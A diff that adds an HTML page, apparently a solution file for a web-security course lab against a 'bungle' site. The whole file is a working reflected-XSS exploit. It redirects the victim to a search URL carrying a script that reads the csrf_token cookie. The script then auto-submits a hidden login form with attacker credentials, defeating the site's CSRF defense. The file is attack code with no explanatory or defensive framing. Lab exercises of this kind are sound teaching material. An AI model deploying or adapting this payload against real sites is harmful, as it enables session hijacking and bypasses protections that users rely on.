@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    var xssPayload = `<script>var token=document.cookie.match(/csrf_token=([^;]+)/)[1];var form=document.createElement('form');form.method='POST';form.action='https://bungle.sysnet.ucsd.edu/login?csrfdefense=1&xssdefense=0';[['username','attacker'],['password','l33th4x'],['csrf_token',token]].forEach(function(f){var i=document.createElement('input');i.type='hidden';i.name=f[0];i.value=f[1];form.appendChild(i)});document.body.appendChild(form);form.submit();<\/script>`;
+
+    window.location = 'https://bungle.sysnet.ucsd.edu/search?xssdefense=0&csrfdefense=1&q=' + encodeURIComponent(xssPayload);
+  </script>
+</body>
+</html>
